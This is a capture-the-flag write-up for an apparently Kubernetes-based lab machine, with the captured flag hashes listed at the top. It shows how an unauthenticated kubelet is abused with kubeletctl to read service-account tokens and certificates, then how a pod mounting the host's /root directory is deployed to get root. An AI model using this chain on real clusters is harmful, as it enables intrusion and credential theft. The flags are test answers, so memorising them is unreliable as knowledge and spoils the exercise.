## Flags
1. user: 4f3a9bb78d60e77be0116d7c06b8bdcb  
2. root: 04e96f56f96f3916fcfb53195c146a5d  

## Enumeration

### 1. Machine
- Running: Kubernetes version v1.22.3  
- Go version: go1.16.9  

### 2. Services
- 22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2  
- 2379/tcp  open  ssl/etcd-client  
- 2380/tcp  open  ssl/etcd-server  
- 8443/tcp  open  ssl/http   Golang net/http server  
- 10249/tcp open  http       Golang net/http server (Go-IPFS JSON-RPC or InfluxDB API)  
- 10250/tcp open  ssl/http   Golang net/http server (Go-IPFS JSON-RPC or InfluxDB API)  
- 10256/tcp open  http       Golang net/http server (Go-IPFS JSON-RPC or InfluxDB API)  

### 3. Port 8443 (SSL/HTTP)
#### Notes
- Returns an error exposing the API version and indicating that the user `system:anonymous` cannot access the path `/`.

#### Directory listing
- `/healthz`  
  - Returns an `ok` message.
- `/version`  
  - Returns the following data:
```json
{
  "major": "1",
  "minor": "22",
  "gitVersion": "v1.22.3",
  "gitCommit": "c92036820499fedefec0f847e2054d824aea6cd1",
  "gitTreeState": "clean",
  "buildDate": "2021-10-27T18:35:25Z",
  "goVersion": "go1.16.9",
  "compiler": "gc",
  "platform": "linux/amd64"
}
```

### 4. Port 10250 (Kubelet)
- The service is accessible and has no authentication enabled.

## Exploitation

### 1. Port 10250 (Kubelet)
- Use the tool `kubeletctl` to list all pods where command execution is possible:
```bash
kubeletctl -s $target pods
```
- A vulnerable pod named `nginx` was found. The user flag was located at `/root/user.txt`:
```bash
kubeletctl exec "cat /root/user.txt" -s $target -p nginx -c nginx
```
- Retrieve the certificate and token files located in:
```
/var/run/secrets/kubernetes.io/serviceaccount/
```

### 2. Port 8443 (Kubernetes API)
- Using the retrieved certificate and token, authentication to the Kubernetes API is possible, allowing the creation of new containers.
- Using `kubectl`, a new pod can be created with the host `/root` directory mounted inside the container.  
  Ensure that the image already exists on the node. To identify the image version, `nginx -v` was executed in the original container.

```bash
# Command
kubectl --token=$token -s https://$target:8443/ --certificate-authority=./ca.crt apply -f nginx.yaml
```

```yaml
# nginx.yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-root
spec:
  containers:
    - name: nginx
      image: nginx:1.14.2
      imagePullPolicy: Never
      volumeMounts:
        - name: root
          mountPath: /mnt/root
  volumes:
    - name: root
      hostPath:
        path: /root
        type: Directory
```

- After deployment, commands can be executed inside the new container, providing access to the host root directory at `/mnt/root`:
```bash
kubeletctl exec "cat /mnt/root/root.txt" -s $target -p nginx-root -c nginx
```

---

**And ladies and gentlemen, we successfully compromised the machine. Enhorabuena.**
